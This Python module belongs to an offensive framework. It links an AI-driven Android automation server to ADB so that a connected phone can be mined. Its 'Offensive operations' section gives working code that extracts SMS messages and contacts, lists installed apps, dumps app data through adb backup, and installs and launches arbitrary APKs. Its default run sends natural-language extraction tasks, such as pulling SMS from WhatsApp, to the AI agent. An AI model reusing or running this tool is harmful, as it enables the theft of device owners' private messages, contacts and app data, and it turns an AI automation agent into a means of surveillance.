"""Artemis Mobile Bridge.

Integrates Google Artemis (https://github.com/google/artemis) Android automation
into EmbedXPL for mobile exploitation workflows.

Artemis provides 99%+ AndroidWorld benchmark accuracy via natural language
instructions sent to an MCP (Model Context Protocol) server that controls
an Android device or emulator via ADB.

Setup:
    # Install Artemis
    git clone https://github.com/google/artemis
    cd artemis
    pip install -e .

    # Start Artemis MCP server
    python -m artemis.server --port 8765

    # Connect device
    adb connect <device_ip>:5555

Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""

from __future__ import annotations

import json
import subprocess
import time
from typing import Any, Optional
import urllib.request
import urllib.error

ARTEMIS_HOST = "http://localhost:8765"
ADB_CMD = "adb"


class ArtemisMobileBridge:
    """Bridge between EmbedXPL and Google Artemis Android automation engine."""

    def __init__(
        self,
        artemis_host: str = ARTEMIS_HOST,
        device: Optional[str] = None,
    ) -> None:
        """Initialize bridge.

        Args:
            artemis_host: Artemis MCP server URL.
            device: ADB device serial (IP:port or USB serial). Uses default if None.
        """
        self.artemis_host = artemis_host.rstrip("/")
        self.device = device
        self._adb_args = ["-s", device] if device else []

    # ------------------------------------------------------------------
    # ADB helpers
    # ------------------------------------------------------------------

    def _adb(self, *args: str, timeout: int = 30) -> tuple[int, str, str]:
        """Run ADB command and return (returncode, stdout, stderr)."""
        cmd = [ADB_CMD] + self._adb_args + list(args)
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding="utf-8",
                errors="replace",
            )
            return result.returncode, result.stdout.strip(), result.stderr.strip()
        except FileNotFoundError:
            return 1, "", "ADB not found. Install Android SDK platform-tools."
        except subprocess.TimeoutExpired:
            return 1, "", f"ADB command timed out after {timeout}s"

    def adb_shell(self, command: str) -> str:
        """Execute a shell command on connected Android device."""
        rc, out, err = self._adb("shell", command)
        return out if rc == 0 else f"ERROR: {err or out}"

    def adb_push(self, local_path: str, remote_path: str) -> bool:
        """Push file to Android device."""
        rc, _, err = self._adb("push", local_path, remote_path)
        if rc != 0:
            print(f"[artemis] Push failed: {err}")
        return rc == 0

    def adb_pull(self, remote_path: str, local_path: str) -> bool:
        """Pull file from Android device."""
        rc, _, err = self._adb("pull", remote_path, local_path)
        if rc != 0:
            print(f"[artemis] Pull failed: {err}")
        return rc == 0

    def adb_install(self, apk_path: str) -> bool:
        """Install APK on connected device."""
        rc, out, err = self._adb("install", "-r", apk_path, timeout=120)
        return rc == 0 and "Success" in out

    def get_device_info(self) -> dict:
        """Collect basic device information."""
        props = {}
        for prop in ["ro.product.model", "ro.product.manufacturer",
                     "ro.build.version.release", "ro.build.version.sdk"]:
            props[prop] = self.adb_shell(f"getprop {prop}")
        return {
            "model": props.get("ro.product.model", "unknown"),
            "manufacturer": props.get("ro.product.manufacturer", "unknown"),
            "android_version": props.get("ro.build.version.release", "unknown"),
            "sdk": props.get("ro.build.version.sdk", "unknown"),
            "serial": self.device or "default",
        }

    # ------------------------------------------------------------------
    # Artemis MCP server
    # ------------------------------------------------------------------

    def is_artemis_running(self) -> bool:
        """Check if Artemis MCP server is reachable."""
        try:
            req = urllib.request.Request(f"{self.artemis_host}/health", method="GET")
            with urllib.request.urlopen(req, timeout=3) as resp:
                return resp.status == 200
        except Exception:
            return False

    def _artemis_post(self, endpoint: str, payload: dict) -> dict:
        """POST to Artemis MCP server."""
        url = f"{self.artemis_host}{endpoint}"
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            url,
            data=data,
            method="POST",
            headers={"Content-Type": "application/json"},
        )
        try:
            with urllib.request.urlopen(req, timeout=120) as resp:
                return json.loads(resp.read())
        except urllib.error.HTTPError as exc:
            body = exc.read().decode(errors="replace")
            return {"error": f"HTTP {exc.code}: {body}"}
        except Exception as exc:
            return {"error": str(exc)}

    def run_task(self, task: str, app: Optional[str] = None) -> dict:
        """Send a natural language task to Artemis for execution.

        Args:
            task: Natural language instruction (e.g., "Extract all SMS messages").
            app: Target app package name (optional, e.g., "com.whatsapp").

        Returns:
            Dict with success status and any extracted data.
        """
        payload: dict[str, Any] = {"task": task}
        if app:
            payload["app"] = app
        if self.device:
            payload["device"] = self.device
        return self._artemis_post("/execute", payload)

    # ------------------------------------------------------------------
    # Offensive operations
    # ------------------------------------------------------------------

    def extract_sms(self) -> list[dict]:
        """Extract SMS messages from device via ADB."""
        output = self.adb_shell(
            "content query --uri content://sms --projection address,body,date,type"
        )
        messages = []
        current: dict = {}
        for line in output.splitlines():
            line = line.strip()
            if line.startswith("Row:"):
                if current:
                    messages.append(current)
                current = {}
            for field in ["address", "body", "date", "type"]:
                if f"{field}=" in line:
                    try:
                        val = line.split(f"{field}=")[1].split(",")[0].strip()
                        current[field] = val
                    except IndexError:
                        pass
        if current:
            messages.append(current)
        return messages

    def extract_contacts(self) -> list[dict]:
        """Extract contacts from device via ADB."""
        output = self.adb_shell(
            "content query --uri content://contacts/phones --projection "
            "display_name,number"
        )
        contacts = []
        for line in output.splitlines():
            if "display_name=" in line:
                try:
                    name = line.split("display_name=")[1].split(",")[0].strip()
                    number = line.split("number=")[1].strip() if "number=" in line else ""
                    contacts.append({"name": name, "number": number})
                except IndexError:
                    pass
        return contacts

    def list_installed_apps(self) -> list[str]:
        """List all installed packages on device."""
        output = self.adb_shell("pm list packages -3")  # -3 = third-party only
        return [
            line.replace("package:", "").strip()
            for line in output.splitlines()
            if line.startswith("package:")
        ]

    def dump_app_data(self, package: str, local_dir: str = ".tmp") -> bool:
        """Backup application data (requires adb backup or root)."""
        print(f"[artemis] Dumping data for {package}...")
        local_file = f"{local_dir}/{package}.ab"
        rc, _, err = self._adb("backup", "-noapk", package, "-f", local_file)
        if rc != 0:
            print(f"[artemis] Backup failed: {err}")
        return rc == 0

    def install_apk_and_run(self, apk_path: str, package: str, main_activity: str) -> bool:
        """Install APK and launch main activity."""
        if not self.adb_install(apk_path):
            return False
        time.sleep(2)
        rc, _, err = self._adb(
            "shell", "am", "start", "-n", f"{package}/{main_activity}"
        )
        return rc == 0

    def run_artemis_task(self, task: str, app: Optional[str] = None) -> dict:
        """Execute natural language task via Artemis (requires MCP server).

        Falls back to raw ADB if Artemis is not running.
        """
        if not self.is_artemis_running():
            return {
                "error": "Artemis MCP server not running.",
                "hint": "Start with: python -m artemis.server --port 8765",
                "fallback": "Use adb_shell() for manual commands.",
            }
        return self.run_task(task, app)

    # ------------------------------------------------------------------
    # Check + run interface (EmbedXPL contract compatible)
    # ------------------------------------------------------------------

    def check(self) -> bool:
        """Verify ADB device is connected."""
        rc, out, _ = self._adb("devices")
        lines = [l for l in out.splitlines() if "\t" in l and "offline" not in l]
        return len(lines) > 0

    def run(self, task: str = "Extract device info and installed apps") -> dict:
        """Run a default data extraction task.

        Args:
            task: Natural language task for Artemis, or 'manual' for ADB-only.

        Returns:
            Dict with device info, apps, and any extracted data.
        """
        if not self.check():
            return {"error": "No ADB device connected. Connect via USB or: adb connect <ip>:5555"}

        result = {
            "device": self.get_device_info(),
            "installed_apps": self.list_installed_apps(),
        }

        # Try Artemis for natural language task
        if self.is_artemis_running():
            result["artemis_task"] = self.run_task(task)
        else:
            result["artemis_note"] = "Artemis MCP not running; returning ADB-only data"
            result["contacts_count"] = len(self.extract_contacts())
            result["sms_count"] = len(self.extract_sms())

        return result
